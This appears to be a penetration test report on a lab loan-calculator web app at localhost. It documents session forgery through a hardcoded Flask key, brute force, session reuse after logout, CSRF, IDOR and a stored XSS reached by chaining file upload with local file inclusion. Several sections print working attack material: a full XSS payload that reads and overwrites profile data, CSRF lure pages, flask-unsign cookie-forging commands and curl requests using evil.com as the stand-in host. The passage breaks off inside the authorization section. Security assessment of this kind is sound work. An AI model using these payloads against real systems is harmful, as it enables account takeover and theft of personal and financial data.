# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:42029/
- **Assessment Date:** 2025-11-01
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**

Five critical authentication vulnerabilities were successfully exploited:
- **Complete Authentication Bypass via Session Forgery (CRITICAL):** Hardcoded secret key 'your_secret_key' enables trivial session cookie forgery, allowing impersonation of any user without credentials
- **Unlimited Brute Force (CRITICAL):** Zero rate limiting allows 76+ requests/second, enabling rapid credential compromise
- **Session Reuse After Logout (CRITICAL):** Logout fails to invalidate sessions server-side, allowing stolen cookies to remain valid indefinitely
- **Default Credentials (HIGH):** Hardcoded test:test credentials provide immediate unauthorized access
- **CSRF via Missing SameSite Cookie (HIGH):** All state-changing operations vulnerable to cross-site attacks, enabling profile modification and account takeover via email changes

Three additional authentication vulnerabilities require internal network access (session hijacking via non-secure cookie flag, plaintext password storage requiring database access, and credential interception via HTTP-only transmission requiring MITM position).

**Authorization Vulnerabilities:**

Five critical horizontal IDOR vulnerabilities were successfully exploited through session forgery:
- **Unauthorized Profile Data Access:** Complete exposure of victim's PII including name, email, and financial data
- **Unauthorized Profile Modification:** Ability to modify any user's profile data including email (enabling account takeover)
- **Profile Modification + Malicious File Upload:** Combined data modification with unrestricted file upload capabilities, enabling backdoors and web shells
- **Unauthorized Home Page Access:** Privacy violation exposing victim's name and identity
- **Unauthorized Financial Data Access:** Complete exposure of sensitive loan amounts, terms, and payment schedules

All vulnerabilities stem from the weak session secret key enabling session forgery combined with complete absence of object ownership validation in the authorization model.

**Cross-Site Scripting (XSS) Vulnerabilities:**

One critical stored XSS vulnerability was successfully exploited:
- **Stored XSS via File Upload + LFI Chain (CRITICAL):** Unrestricted file upload allows HTML file uploads, which when included via the error page's Local File Inclusion vulnerability, executes arbitrary JavaScript in victim browsers. Demonstrated impact includes complete profile data exfiltration and unauthorized profile modification without CSRF tokens. Attack enables account takeover, credential phishing, session riding, and malware distribution.

**SQL/Command Injection Vulnerabilities:**

No SQL or command injection vulnerabilities were found. The single queued vulnerability (INJ-VULN-01) claiming Server-Side Template Injection was determined to be a false positive after exhaustive testing. SQLAlchemy ORM provides effective parameterization preventing SQL injection, and no command execution sinks exist in the codebase.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found. The application makes zero outbound HTTP requests and has no URL parameter processing that could enable SSRF attacks. The architecture is purely request-response with no external integrations.

## Network Reconnaissance

**Open Ports and Services:**
- **Port 22/tcp:** OpenSSH 9.9 (remote administration, out of scope)
- **Port 80/tcp:** Caddy httpd (proxy/CDN service, not used by target app)
- **Port 443/tcp:** HTTPS service (not configured for target app)
- **Port 8000/tcp:** WSGIServer 0.2 "SSTI Demo" (out of scope test application)
- **Port 8001/tcp:** WSGIServer 0.2 "SSTI Demo" (out of scope test application)
- **Port 8888/tcp:** BaseHTTPServer 0.6 "SSRF Test Server" (out of scope)
- **Port 9999/tcp:** SimpleHTTPServer 0.6 Python file server
- **Target Application Port:** 42029 (dynamically mapped Docker port)

**Security-Relevant Findings:**
- **No TLS/SSL Configuration:** Target application serves only unencrypted HTTP on port 80, exposing all traffic including credentials to interception
- **Apache 2.4.65 on Debian:** Modern version with no known critical vulnerabilities
- **MySQL 5.7:** End-of-life database (EOL October 2023) no longer receiving security updates, though port 3306 not externally exposed
- **Wildcard CORS Policy:** Access-Control-Allow-Origin: * enables cross-origin requests from any domain
- **Directory Indexing Enabled:** Static file directory allows directory browsing via Apache "Options Indexes"
- **Multiple Test Applications:** Additional vulnerable test services running on ports 8000, 8001, and 8888 increase attack surface

**Subdomain Enumeration:**
Subfinder discovered 16 subdomains (naeu2.naeuinc.localhost, server02.counterintel.localhost, mail.localhost, etc.) appearing to be test/development artifacts. Actual application runs on localhost:42029 with no subdomain routing observed.

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

No SQL injection, command injection, or server-side template injection vulnerabilities were successfully exploited. The single vulnerability in the queue (INJ-VULN-01 claiming SSTI) was determined to be a false positive after exhaustive testing with 15+ distinct exploitation attempts using curl, browser automation, and local code reproduction. User input is safely handled as Jinja2 template variable values, not executable template code.

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Stored XSS via File Upload + LFI Chain

**Summary:**
- **Vulnerable location:** File upload at `POST http://localhost:42029/update_profile` combined with Local File Inclusion at `GET http://localhost:42029/error?error_type=../images/[filename]`
- **Overview:** Attacker uploads malicious HTML file through unrestricted file upload, then triggers JavaScript execution by including the uploaded file via LFI in the error page template rendering
- **Impact:** Complete unauthorized profile modification, sensitive data exfiltration, persistent XSS allowing attacker to execute arbitrary JavaScript in victim's browser context
- **Severity:** Critical (CVSS 8.7) - Confidentiality: HIGH, Integrity: HIGH, Availability: LOW

**Prerequisites:**
- Authentication required to upload malicious file (default credentials: test/test available)
- No special tools required beyond standard web browser or curl/fetch API
- Application running at http://localhost:42029/

**Exploitation Steps:**

**Phase 1: Upload Malicious HTML File**

1. Authenticate to the application:
   ```bash
   curl -X POST http://localhost:42029/login \
     -d "username=test&password=test" \
     -c cookies.txt -L
   ```

2. Create malicious HTML payload file (`advanced_xss_payload.html`):
   ```html
   <div style="display:none" id="exploit-container">
   <h3>XSS Exploitation in Progress...</h3>
   </div>
   <script>
   (async function() {
       const results = {
           exploitation_target: 'http://localhost:42029/',
           timestamp: new Date().toISOString(),
           domain: document.domain,
           url: window.location.href,
           cookies: document.cookie || 'HttpOnly flag prevents access',
           unauthorized_actions: []
       };

       // Exfiltrate user profile data
       try {
           const profileResponse = await fetch('/profile');
           const profileHtml = await profileResponse.text();

           const parser = new DOMParser();
           const profileDoc = parser.parseFromString(profileHtml, 'text/html');
           const inputs = profileDoc.querySelectorAll('input[type="text"], input[type="email"]');

           const profileData = {};
           inputs.forEach(input => {
               const label = input.previousElementSibling?.textContent || 'unknown';
               profileData[label] = input.value;
           });

           results.unauthorized_actions.push({
               action: 'Profile Data Exfiltration',
               success: true,
               data: profileData
           });
       } catch (e) {
           results.unauthorized_actions.push({
               action: 'Profile Data Exfiltration',
               success: false,
               error: e.message
           });
       }

       // Perform unauthorized profile modification
       try {
           const formData = new FormData();
           formData.append('name', 'HACKED_BY_XSS');
           formData.append('lastname', 'EXPLOITED');
           formData.append('email', 'attacker@evil.com');
           formData.append('loan_amount', '999999');
           formData.append('loan_term_months', '999');
           formData.append('monthly_payment', '1');

           const modifyResponse = await fetch('/profile', {
               method: 'POST',
               body: formData
           });

           results.unauthorized_actions.push({
               action: 'Unauthorized Profile Modification',
               success: modifyResponse.ok,
               status: modifyResponse.status,
               note: 'Profile modified to demonstrate impact'
           });
       } catch (e) {
           results.unauthorized_actions.push({
               action: 'Unauthorized Profile Modification',
               success: false,
               error: e.message
           });
       }

       // Display results
       console.log('=== XSS EXPLOITATION RESULTS ===');
       console.log(JSON.stringify(results, null, 2));

       const container = document.getElementById('exploit-container');
       container.style.display = 'block';
       container.style.border = '3px solid red';
       container.style.padding = '20px';
       container.style.background = '#ffe0e0';
       container.innerHTML = '<h2>XSS EXPLOITATION COMPLETE</h2><pre>' + JSON.stringify(results, null, 2) + '</pre>';
   })();
   </script>
   ```

3. Upload the malicious file via the profile update form:
   ```bash
   curl -X POST http://localhost:42029/update_profile \
     -b cookies.txt \
     -F "name=Test" \
     -F "lastname=User" \
     -F "email=test@test.com" \
     -F "loan_amount=10000" \
     -F "loan_term_months=60" \
     -F "monthly_payment=212.47" \
     -F "image_profile=@advanced_xss_payload.html"
   ```

   **Expected result:** File uploaded successfully to `/var/www/loan_calculator/app/static/images/advanced_xss_payload.html`

**Phase 2: Trigger XSS Execution via Local File Inclusion**

4. Navigate to the error page with LFI payload to execute the uploaded JavaScript:
   ```
   http://localhost:42029/error?error_type=../images/advanced_xss_payload.html
   ```

   Or using curl:
   ```bash
   curl http://localhost:42029/error?error_type=../images/advanced_xss_payload.html \
     -b cookies.txt
   ```

   **Path resolution:**
   - Input: `error_type=../images/advanced_xss_payload.html`
   - Backend processing: `error_type = 'templates/' + '../images/advanced_xss_payload.html'`
   - Resolved path: `templates/../images/advanced_xss_payload.html` → `/var/www/loan_calculator/app/static/images/advanced_xss_payload.html`
   - Path traversal validation passes (file is within `/static/` directory)
   - Jinja2 template directive: `{% include 'images/advanced_xss_payload.html' %}`
   - Result: HTML rendered and JavaScript executed in browser

**Phase 3: Verify Impact**

5. Check browser console for exploitation results:
   ```
   Expected console output:
   === XSS EXPLOITATION RESULTS ===
   {
     "exploitation_target": "http://localhost:42029/",
     "timestamp": "2025-10-31T18:57:09.564Z",
     "domain": "localhost",
     "url": "http://localhost:42029/error?error_type=../images/advanced_xss_payload.html",
     "cookies": "HttpOnly flag prevents access",
     "unauthorized_actions": [
       {
         "action": "Profile Data Exfiltration",
         "success": true,
         "data": {
           "Name:": "\" onclick=\"alert(1)\"",
           "Last Name:": "Doe",
           "Email:": "test@test.com",
           "Loan Amount:": "10000.0",
           "Loan Term (Months):": "60",
           "Monthly Payment:": "212.47"
         }
       },
       {
         "action": "Unauthorized Profile Modification",
         "success": true,
         "status": 200,
         "note": "Profile modified to demonstrate impact"
       }
     ]
   }
   ```

6. Verify unauthorized profile modification by navigating to the profile page:
   ```
   http://localhost:42029/profile
   ```

   **Expected result:**
   - Name: HACKED_BY_XSS (modified from original value)
   - Last Name: EXPLOITED (modified from "Doe")
   - Email: attacker@evil.com (modified from "test@test.com")
   - Loan Amount: 999999.0 (modified from "10000.0")
   - Loan Term: 999 months (modified from "60")
   - Monthly Payment: 1.0 (modified from "212.47")

7. Verify persistence by checking the home page:
   ```
   http://localhost:42029/home
   ```

   **Expected result:** Page displays "Welcome HACKED_BY_XSS EXPLOITED!" instead of original user name

8. Verify loan details page also reflects modified data:
   ```
   http://localhost:42029/loan_details
   ```

   **Expected result:**
   - "Your loan principal is 999999.0"
   - "The term of your loan principal 999 months"
   - "Your monthly payment is 1.0"

**Proof of Impact:**

**1. JavaScript Execution Confirmed:**
   - Browser console log: "=== XSS EXPLOITATION RESULTS ===" @ http://localhost:42029/error?error_type=../images/advanced_xss_payload.html
   - Complete JavaScript execution with full DOM access
   - No Content Security Policy (CSP) restrictions

**2. Sensitive Data Exfiltration:**
   - Successfully extracted user profile data via XSS-triggered fetch request:
     - Name: "\" onclick=\"alert(1)\""
     - Last Name: Doe
     - Email: test@test.com
     - Loan Amount: 10000.0
     - Loan Term: 60 months
     - Monthly Payment: 212.47
   - Data captured and logged to console (in real attack, would be exfiltrated to attacker server)

**3. Unauthorized Profile Modification (Critical Impact):**
   - XSS payload successfully performed POST request to `/profile` endpoint
   - Response status: 200 (success)
   - Complete profile data modification achieved:
     - Name changed to "HACKED_BY_XSS"
     - Last name changed to "EXPLOITED"
     - Email changed to "attacker@evil.com"
     - Loan amount changed to 999999.0
     - Loan term changed to 999 months
     - Monthly payment changed to 1.0
   - Modifications persisted across all application pages (home, profile, loan_details)

**4. Attack Vector Characteristics:**
   - **Persistence:** Stored XSS - malicious file remains on server until manually deleted
   - **Scope:** Any user (authenticated or unauthenticated) who visits the crafted URL will have JavaScript executed in their browser context
   - **No CSRF Protection:** Profile modification succeeded without CSRF tokens
   - **HttpOnly Flag:** Session cookies are HttpOnly-protected (document.cookie returns empty), preventing direct cookie theft but not preventing unauthorized actions

**5. Additional Attack Scenarios Enabled:**
   - **Cross-Site Request Forgery via XSS:** Attacker can perform any authenticated action on behalf of victim
   - **Credential Phishing:** XSS can inject fake login forms to capture passwords
   - **Session Riding:** Use victim's existing session to perform actions without needing to steal cookies
   - **Information Disclosure:** Extract any data visible in the DOM or accessible via fetch API
   - **Malware Distribution:** Redirect users to malicious sites or trigger drive-by downloads
   - **Privilege Escalation:** If admin user visits malicious link, attacker gains admin access

**Notes:**

**Authentication Requirement:**
- Attacker must be authenticated to upload the malicious file
- Default credentials (test/test) are publicly known and provide immediate access
- However, once uploaded, the XSS link can be shared with ANY user (authenticated or not)
- Victim does not need to be authenticated to have JavaScript execute in their browser

**Vulnerability Root Causes:**
1. **Unrestricted File Upload:** No file type validation, MIME type checking, or content sanitization on `/update_profile` endpoint
   - Application accepts HTML files when only image files should be allowed
   - No file extension whitelist (should restrict to .png, .jpg, .gif, etc.)
   - Code location: `/app/website/app/routes.py` lines 100-112

2. **Local File Inclusion:** Error page allows including arbitrary files from `/static/` directory via `error_type` parameter
   - No whitelist of allowed template files
   - Path traversal allowed within `/static/` directory
   - Code location: `/app/website/app/routes.py` lines 122-133, `/app/website/app/static/templates/error.html` line 27

3. **Dangerous Template Inclusion:** Jinja2 `{% include %}` directive renders included files as templates, executing embedded JavaScript
   - Uploaded user content treated as trusted template code
   - No Content Security Policy to restrict inline script execution

**Security Controls Bypassed:**
- ✅ Jinja2 auto-escaping: Bypassed by using template inclusion instead of variable interpolation
- ❌ No Content Security Policy (CSP): Inline scripts execute freely
- ❌ No file upload validation: HTML files accepted in image upload field
- ❌ No template inclusion whitelist: Any file in `/static/` can be included
- ❌ No CSRF protection: State-changing operations succeed without tokens
- ⚠️ HttpOnly flag: Prevents direct cookie theft but doesn't prevent XSS-driven actions

**Business Impact:**
- **Account Takeover:** Attacker can modify victim's profile, email address for password reset attacks
- **Financial Data Manipulation:** Loan amounts and payment information can be altered
- **Reputation Damage:** Persistent XSS can affect all users visiting the malicious link
- **Compliance Violations:** Unauthorized access to PII (name, email, financial data)
- **Credential Harvesting:** XSS can inject phishing forms to capture user credentials

**Evidence Artifacts:**
- Screenshot 1: xss_exploitation_profile_modified.png - Shows profile page with modified data (HACKED_BY_XSS, EXPLOITED, attacker@evil.com, etc.)
- Screenshot 2: xss_exploitation_home_page.png - Shows home page displaying "Welcome HACKED_BY_XSS EXPLOITED!"
- Payload file: /tmp/advanced_xss_payload.html - Complete malicious HTML payload
- Console logs: Full exploitation results logged to browser console with timestamps and action details

**Remediation Priority:** CRITICAL - Immediate action required

---

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-06: Default Credential Authentication Bypass

**Summary:**
- **Vulnerable location:** POST /login endpoint (http://localhost:42029/login)
- **Overview:** Application contains hardcoded default credentials (test:test) that are automatically created on startup and cannot be disabled
- **Impact:** Immediate unauthorized access to authenticated user accounts without requiring credential theft or brute force
- **Severity:** HIGH

**Prerequisites:**
None - credentials are publicly visible in source code at `/app/website/app/__init__.py:20-35`

**Exploitation Steps:**

1. Attempt login with known default credentials:
```bash
curl -v -X POST http://localhost:42029/login \
  -d "username=test&password=test" \
  -c /tmp/session_cookies.txt
```

Expected response: HTTP 302 redirect to /home with Set-Cookie header

2. Verify authenticated access to protected resources:
```bash
curl -b /tmp/session_cookies.txt http://localhost:42029/profile
```

Expected response: HTTP 200 with user profile data including:
- Name: " onclick="alert(1)" (or other value)
- Email: test@test.com
- Loan Amount: 10000.0
- Loan Term: 60 months
- Monthly Payment: 212.47

3. Access other protected endpoints:
```bash
curl -b /tmp/session_cookies.txt http://localhost:42029/loan_details
curl -b /tmp/session_cookies.txt http://localhost:42029/home
```

**Proof of Impact:**
Successfully authenticated as user with default credentials and accessed:
- Complete user profile information (PII)
- Financial data (loan amounts, payment schedules)
- Ability to modify profile data via /update_profile endpoint
- Full access to all authenticated functionality

**Notes:**
- Default account is recreated on every application restart if deleted
- Credentials are visible in public source code repository
- No mechanism exists to disable or change default credentials via configuration
- Combined with session forgery vulnerability (AUTH-VULN-02), enables complete authentication bypass

---

### AUTH-VULN-02: Complete Authentication Bypass via Session Forgery

**Summary:**
- **Vulnerable location:** Application-wide session management (/app/website/app/__init__.py:8)
- **Overview:** Flask session secret key is hardcoded as 'your_secret_key' - a well-known placeholder from documentation with ~0 bits of entropy
- **Impact:** Complete authentication bypass allowing impersonation of any user account without credentials
- **Severity:** CRITICAL

**Prerequisites:**
- Knowledge of weak secret key: 'your_secret_key' (public in source code)
- Tool to forge Flask sessions: flask-unsign (or Python itsdangerous library)
- Valid user_id value to impersonate (can enumerate: 1, 2, 3, etc.)

**Exploitation Steps:**

1. Decode an existing session cookie to understand structure:
```bash
flask-unsign --decode --cookie 'eyJ1c2VyX2lkIjoxfQ.aQUGMg.4uw7x1q77gowFPnonAp_EVm3qyk'
```

Expected output: `{'user_id': 1}`

2. Forge a session cookie for target user (user_id=2):
```bash
flask-unsign --sign --cookie "{'user_id': 2}" --secret 'your_secret_key'
```

Output: `eyJ1c2VyX2lkIjoyfQ.aQUIkQ.0mZoiC6KnfmR3j4jw_BQqyTwhjg`

3. Use forged session to access victim's profile:
```bash
FORGED_SESSION="eyJ1c2VyX2lkIjoyfQ.aQUIkQ.0mZoiC6KnfmR3j4jw_BQqyTwhjg"
curl -b "session=$FORGED_SESSION" http://localhost:42029/profile
```

Expected response: HTTP 200 with user_id=2's profile data showing:
- Name: Alice
- Lastname: Victim
- Email: hacked@attacker.com
- Loan Amount: 75000.0
- Loan Term: 180 months
- Monthly Payment: 833.33

4. Verify complete account takeover by accessing other endpoints:
```bash
curl -b "session=$FORGED_SESSION" http://localhost:42029/home
curl -b "session=$FORGED_SESSION" http://localhost:42029/loan_details
```

5. Demonstrate write access by modifying victim's profile:
```bash
curl -X POST http://localhost:42029/update_profile \
  -b "session=$FORGED_SESSION" \
  -d "name=ATTACKER&lastname=COMPROMISED&email=attacker@evil.com&loan_amount=99999&loan_term_months=1&monthly_payment=99999"
```

**Proof of Impact:**
Successfully forged valid session cookies and achieved:
- Complete authentication bypass (no credentials needed)
- Read access to any user's sensitive data (PII, financial information)
- Write access to modify any user's profile data
- Ability to impersonate users 1, 2, 3, and 5 (confirmed to exist)
- Full account takeover capability

**Technical Details:**
- Secret key location: `/app/website/app/__init__.py:8`
- Session signature algorithm: HMAC-SHA1 (Flask/itsdangerous default)
- Session storage: Client-side only (no server-side validation)
- Cookie structure: `base64(data).timestamp.HMAC_signature`

**Notes:**
This vulnerability enables attackers to:
- Bypass authentication entirely without stealing credentials
- Impersonate any user by forging session with their user_id
- Maintain persistent access (sessions never expire server-side)
- Evade detection (forged sessions are cryptographically valid)

---

### AUTH-VULN-03: Unlimited Brute Force via Missing Rate Limiting

**Summary:**
- **Vulnerable location:** POST /login endpoint (http://localhost:42029/login)
- **Overview:** Complete absence of rate limiting, account lockout, CAPTCHA, or any abuse prevention mechanism
- **Impact:** Unlimited password brute force attacks at 76+ requests/second enabling rapid credential compromise
- **Severity:** CRITICAL

**Prerequisites:**
- Target username (can be enumerated or use default 'test')
- Password dictionary/wordlist
- HTTP client capable of rapid requests

**Exploitation Steps:**

1. Execute automated brute force attack script:
```bash
python3 /Users/khaushik/keygraph/pentest/shannon/repos/XBEN-022-24/test_rate_limiting.py
```

Script performs 50 rapid login attempts cycling through common passwords:
- ['admin', 'password', '123456', 'test', 'letmein', 'qwerty', 'welcome', 'monkey', 'dragon', 'master']

2. Observe results showing NO rate limiting:
```
Total attempts:           50
Total time taken:         0.65 seconds
Average requests/second:  76.34
Successful logins (302):  5
Failed logins (200):      45
Rate limit responses:     0
```

3. Verify successful authentication with discovered password:
```bash
curl -X POST http://localhost:42029/login \
  -d "username=test&password=test" \
  -c /tmp/brute_force_session.txt
```

Expected response: HTTP 302 redirect to /home

4. Scale attack with larger wordlist (demonstration):
```bash
# Theoretical attack with rockyou.txt (14 million passwords)
# At 76 req/sec: ~51 hours to exhaust entire wordlist
# At 10 req/sec: ~16 days to exhaust entire wordlist
# No throttling, lockout, or CAPTCHA would prevent this
```

**Proof of Impact:**
Successful demonstration of:
- 76+ requests per second sustained throughput
- Zero HTTP 429 (Too Many Requests) responses
- Zero HTTP 503 (Service Unavailable) responses
- No artificial delays or progressive backoff
- Successful credential discovery via brute force (password: 'test')
- No account lockout after multiple failed attempts
- No CAPTCHA challenges presented

**Technical Details:**
- Attack rate achieved: 76.34 req/sec
- Average response time: 0.013 seconds
- No Flask-Limiter middleware detected
- No Apache mod_ratelimit configuration
- No per-IP throttling implemented
- No failed login tracking in User model

**Attack Scalability:**
With common wordlists:
- Top 1000 passwords: ~13 seconds
- Top 10,000 passwords: ~2 minutes
- RockYou.txt (14M passwords): ~51 hours
- Custom targeted wordlist: Seconds to minutes

**Notes:**
- Attack can be parallelized across multiple IPs for even faster execution
- Combined with user enumeration, enables systematic account compromise
- No logging means attacks are completely undetected
- No notification mechanism to alert legitimate users

---

### AUTH-VULN-05: Session Hijacking via Session Reuse After Logout

**Summary:**
- **Vulnerable location:** GET /logout endpoint (http://localhost:42029/logout)
- **Overview:** Logout only deletes client-side cookie but session token remains cryptographically valid with no server-side invalidation
- **Impact:** Stolen session cookies remain valid indefinitely even after victim logs out, enabling persistent account access
- **Severity:** CRITICAL

**Prerequisites:**
- Captured session cookie (via network sniffing, XSS, session forgery, or physical access)

**Exploitation Steps:**

1. Authenticate and capture a valid session cookie:
```bash
curl -v -X POST http://localhost:42029/login \
  -d "username=test&password=test" \
  -c /tmp/session_reuse_test.txt 2>&1 | grep "Set-Cookie"
```

Captured session: `eyJ1c2VyX2lkIjoxfQ.aQUI8Q.L83H4Gvn-yY5MCCdbQveYR9yyqU`

2. Verify session works before logout:
```bash
SESSION_COOKIE="eyJ1c2VyX2lkIjoxfQ.aQUI8Q.L83H4Gvn-yY5MCCdbQveYR9yyqU"
curl -s -b "session=$SESSION_COOKIE" http://localhost:42029/home | grep "<h2>"
```

Expected output: `<h2>Welcome HACKED_BY_XSS EXPLOITED!</h2>`

3. Victim performs logout:
```bash
curl -s -b "session=$SESSION_COOKIE" http://localhost:42029/logout
```

Expected response: HTTP 302 redirect to /login

4. Attacker reuses captured session AFTER victim logout:
```bash
curl -s -b "session=$SESSION_COOKIE" http://localhost:42029/home | grep -E "(<title>|<h2>)"
```

Expected output:
```
<title>Home</title>
<h2>Welcome HACKED_BY_XSS EXPLOITED!</h2>
```

**Proof of Impact:**
Successfully demonstrated:
- Session cookie remains cryptographically valid after logout
- Full access to victim's account maintained after logout
- Access to all protected endpoints: /home, /profile, /loan_details, /update_profile
- Ability to read and modify victim's data post-logout
- No server-side session revocation mechanism

**Technical Details:**
- Logout implementation: `session.pop('user_id', None)` at `/app/website/app/routes.py:44`
- Session storage: Client-side signed cookies only (no server-side session database)
- Session validation: Only verifies HMAC signature, not revocation status
- No session blacklist or invalidation list maintained
- Cookie deletion is client-side only (attacker retains copy)

**Attack Scenarios:**
1. **Network Interception:** Attacker captures session via MITM → victim logs out → attacker maintains access
2. **XSS/Session Theft:** Attacker steals cookie via XSS → victim logs out thinking they're safe → attacker continues access
3. **Physical Access:** Attacker copies cookie from victim's browser → victim logs out → attacker uses copied cookie
4. **Session Fixation:** Attacker provides fixed session → victim logs in → victim logs out → attacker reuses session

**Notes:**
- Sessions persist indefinitely (no server-side timeout)
- Combined with AUTH-VULN-07 (no timeout), attack window is unlimited
- Logout should implement server-side session invalidation
- No notification to user that their session is still active elsewhere

---

### AUTH-VULN-09: Cross-Site Request Forgery (CSRF) via Missing SameSite Cookie

**Summary:**
- **Vulnerable location:** All state-changing endpoints (POST /update_profile, GET /logout, POST /profile)
- **Overview:** Missing SameSite cookie attribute combined with no CSRF token validation allows cross-origin requests with victim's session cookies
- **Impact:** Complete account takeover via email modification, profile manipulation, and forced logout
- **Severity:** HIGH

**Prerequisites:**
- Victim must be authenticated to http://localhost:42029
- Attacker must trick victim into visiting malicious webpage
- Victim's browser must support automatic cookie transmission (all modern browsers)

**Exploitation Steps:**

**Attack 1: Profile Modification CSRF**

1. Create malicious HTML page (/tmp/csrf_poc.html):
```html
<!DOCTYPE html>
<html>
<head>
    <title>Legitimate Banking Offer</title>
</head>
<body>
    <h1>Congratulations! You've Won a Prize!</h1>
    <p>Loading your prize details...</p>

    <iframe name="csrf_frame" style="display:none;"></iframe>
    <form id="csrf_form" method="POST" action="http://localhost:42029/update_profile" target="csrf_frame">
        <input type="hidden" name="name" value="CSRF_VICTIM">
        <input type="hidden" name="lastname" value="HACKED">
        <input type="hidden" name="email" value="csrf_attack@evil.com">
        <input type="hidden" name="loan_amount" value="99999">
        <input type="hidden" name="loan_term_months" value="1">
        <input type="hidden" name="monthly_payment" value="99999">
    </form>

    <script>
        document.getElementById('csrf_form').submit();
    </script>
</body>
</html>
```

2. Victim logs into application:
```bash
curl -X POST http://localhost:42029/login \
  -d "username=test&password=test" \
  -c /tmp/victim_cookies.txt
```

3. Victim visits attacker's malicious page (simulated via curl with victim's cookies):
```bash
curl -X POST http://localhost:42029/update_profile \
  -H "Origin: http://evil.com" \
  -H "Referer: http://evil.com/csrf_poc.html" \
  -b /tmp/victim_cookies.txt \
  -d "name=CSRF_VICTIM&lastname=HACKED&email=csrf_attack@evil.com&loan_amount=99999&loan_term_months=1&monthly_payment=99999"
```

Expected response: HTTP 302 redirect to /profile (success)

4. Verify profile was modified:
```bash
curl -b /tmp/victim_cookies.txt http://localhost:42029/profile | grep "CSRF_VICTIM"
```

Expected output: Input fields containing "CSRF_VICTIM", "HACKED", "csrf_attack@evil.com"

**Attack 2: Logout CSRF (Denial of Service)**

1. Create logout CSRF page (/tmp/csrf_logout.html):
```html
<!DOCTYPE html>
<html>
<head>
    <title>Funny Cat Pictures</title>
</head>
<body>
    <h1>Loading funny cats...</h1>
    <img src="http://localhost:42029/logout" style="display:none;">
    <iframe src="http://localhost:42029/logout" style="display:none;"></iframe>
</body>
</html>
```

2. Victim authenticated, visits page:
```bash
# Simulated logout via CSRF
curl -b /tmp/victim_cookies.txt http://localhost:42029/logout
```

3. Victim's session is destroyed without their knowledge:
```bash
curl -b /tmp/victim_cookies.txt http://localhost:42029/home
```

Expected response: HTTP 302 redirect to /login (session destroyed)

**Proof of Impact:**
Successfully demonstrated:
- Profile modification without victim's knowledge or consent
- Email changed to attacker-controlled address (enables password reset account takeover)
- Financial data manipulation (loan amounts changed to fraudulent values)
- Forced logout causing denial of service
- No CSRF token validation on any endpoint
- No Origin/Referer header validation
- SameSite cookie attribute not configured (defaults to None)

**Technical Details:**
- Cookie configuration: No `SESSION_COOKIE_SAMESITE` in `/app/website/app/__init__.py`
- CSRF protection: None (no Flask-WTF, no CSRF tokens)
- Origin validation: None (no Origin/Referer header checks)
- Logout method: GET (vulnerable to `<img>` tag attacks) at `/app/website/app/routes.py:41`
- CORS policy: Wildcard `Access-Control-Allow-Origin: *` enables cross-origin requests

**Attack Scenarios:**

**Scenario 1: Account Takeover via Email Change**
1. Attacker sends victim malicious link: "You've won a prize!"
2. Victim clicks while authenticated to loan application
3. CSRF changes email to attacker@evil.com
4. Attacker initiates password reset (if feature existed)
5. Reset link sent to attacker's email
6. Complete account takeover achieved

**Scenario 2: Financial Fraud**
1. Attacker creates CSRF form changing loan amount to $999,999
2. Victim visits malicious page
3. Loan application shows fraudulent amount
4. Could impact credit reporting or loan approvals

**Scenario 3: Session Hijacking**
1. Attacker forces logout via `<img>` tag
2. Victim re-authenticates on phishing page (thinking original session expired)
3. Credentials captured by attacker

**Notes:**
- Automated testing script available: /tmp/csrf_exploit.py
- Comprehensive documentation: /tmp/csrf_testing_guide.md, /tmp/README_CSRF_DEMO.md
- POC files: /tmp/csrf_poc.html, /tmp/csrf_logout.html
- Affects ALL state-changing operations (no CSRF protection implemented)
- Combined with wildcard CORS, allows any origin to make authenticated requests

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Horizontal IDOR - Unauthorized Profile Data Access via Session Forgery

**Summary:**
- **Vulnerable location:** GET /profile endpoint at `/app/website/app/routes.py:60-81`
- **Overview:** An attacker can forge Flask session cookies with arbitrary user_id values to access any user's complete profile information, including PII and sensitive personal data.
- **Impact:** Complete unauthorized access to victim's personally identifiable information (PII) including name, lastname, email address, and loan details. This enables identity theft, social engineering attacks, and privacy violations.
- **Severity:** Critical

**Prerequisites:**
1. Knowledge of the weak Flask secret key: `'your_secret_key'` (hardcoded at `/app/website/app/__init__.py:8`)
2. flask-unsign tool or equivalent session forgery capability
3. Valid user_id value for the target victim (user IDs are sequential integers starting from 1)
4. Network access to http://localhost:42029/

**Exploitation Steps:**

1. **Install flask-unsign tool:**
   ```bash
   pip install flask-unsign
   ```

2. **Forge session cookie for victim user_id:**
   ```bash
   flask-unsign --sign --cookie "{'user_id': 2}" --secret 'your_secret_key'
   ```
   Output: `eyJ1c2VyX2lkIjoyfQ.aQUGSw.Qs7h67AZBTpvKGmOy81SuuE2dXI`

3. **Send GET request to /profile with forged session:**
   ```python
   import requests

   forged_session = "eyJ1c2VyX2lkIjoyfQ.aQUGSw.Qs7h67AZBTpvKGmOy81SuuE2dXI"
   response = requests.get(
       "http://localhost:42029/profile",
       cookies={"session": forged_session}
   )
   ```

4. **Extract victim's PII from response:**
   The response HTML contains form fields populated with the victim's data:
   - Name: `<input name="name" value="Alice">`
   - Lastname: `<input name="lastname" value="Victim">`
   - Email: `<input name="email" value="alice@victim.com">`
   - Loan Amount: `<input name="loan_amount" value="50000.0">`
   - Loan Term: `<input name="loan_term_months" value="120">`
   - Monthly Payment: `<input name="monthly_payment" value="625.5">`

**Proof of Impact:**

Successfully accessed victim (user_id=2) profile data:
```
Status: 200 OK
Victim's Profile Data:
  name: Alice
  lastname: Victim
  email: alice@victim.com
  loan_amount: 50000.0
  loan_term_months: 120
  monthly_payment: 625.5
```

**Notes:**
- This vulnerability affects all authenticated users in the system
- User enumeration is trivial due to sequential integer user IDs
- The weak secret key makes session forgery extremely easy
- No ownership validation exists in the code - the application blindly trusts the session-provided user_id

---

### AUTHZ-VULN-02: Horizontal IDOR - Unauthorized Profile Modification via Session Forgery

**Summary:**
- **Vulnerable location:** POST /profile endpoint at `/app/website/app/routes.py:60-75`
- **Overview:** An attacker can forge session cookies to modify any user's profile data, including name, email address, and loan details. This enables account takeover by changing the victim's email address.
